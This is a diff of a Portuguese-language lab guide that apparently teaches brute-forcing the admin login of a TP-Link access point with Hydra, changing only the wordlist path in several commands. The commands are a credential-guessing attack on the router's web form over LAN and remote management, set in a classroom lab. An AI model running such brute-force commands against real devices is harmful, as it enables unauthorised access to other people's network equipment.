@@ -177,7 +177,7 @@ Com o formulário mapeado (seção 04) e assumindo que a senha trafega em texto 
 ### 🔧 Procedimento — Sintaxe Geral
 
 ```bash
-hydra -l admin -P 05-wordlist/01-wordlist-lab.txt \
+hydra -l admin -P 02-wordlist-lab-expandida.txt \
   <IP_LAN_DO_AP> \
   http-post-form \
   "/<ENDPOINT_LOGIN>:username=^USER^&password=^PASS^:F=<TEXTO_DE_FALHA>"
@@ -186,7 +186,7 @@ hydra -l admin -P 05-wordlist/01-wordlist-lab.txt \
 | Parâmetro | Descrição |
 |---|---|
 | `-l admin` | Usuário fixo a ser testado (login administrativo padrão do TP-Link). |
-| `-P 05-wordlist/01-wordlist-lab.txt` | Caminho da wordlist de senhas a testar (arquivo `-P` = *password list*; use `-p` para uma única senha). |
+| `-P 02-wordlist-lab-expandida.txt` | Caminho da wordlist de senhas a testar (arquivo `-P` = *password list*; use `-p` para uma única senha). |
 | `<IP_LAN_DO_AP>` | Endereço IP da interface LAN do AP (ex.: `172.16.0x.254`, conforme configurado na Aula 02). |
 | `http-post-form` | Módulo do Hydra especializado em formulários web via `POST`. |
 | `/<ENDPOINT_LOGIN>` | Caminho identificado na seção 04 (ex.: `/` ou `/login.cgi`). |
@@ -196,7 +196,7 @@ hydra -l admin -P 05-wordlist/01-wordlist-lab.txt \
 ### 🔧 Exemplo com a Wordlist Expandida (segunda rodada)
 
 ```bash
-hydra -l admin -P 05-wordlist/02-wordlist-lab-expandida.txt \
+hydra -l admin -P 02-wordlist-lab-expandida.txt \
   172.16.0X.254 \
   http-post-form \
   "/:username=^USER^&password=^PASS^:F=invalid" \
@@ -233,7 +233,7 @@ Com o Gerenciamento Remoto habilitado (seção 02), o mesmo ataque pode ser repr
 ### 🔧 Procedimento
 
 ```bash
-hydra -l admin -P 05-wordlist/01-wordlist-lab.txt \
+hydra -l admin -P 02-wordlist-lab-expandida.txt \
   -s <PORTA_REMOTA> \
   <IP_WAN_DO_AP> \
   https-post-form \
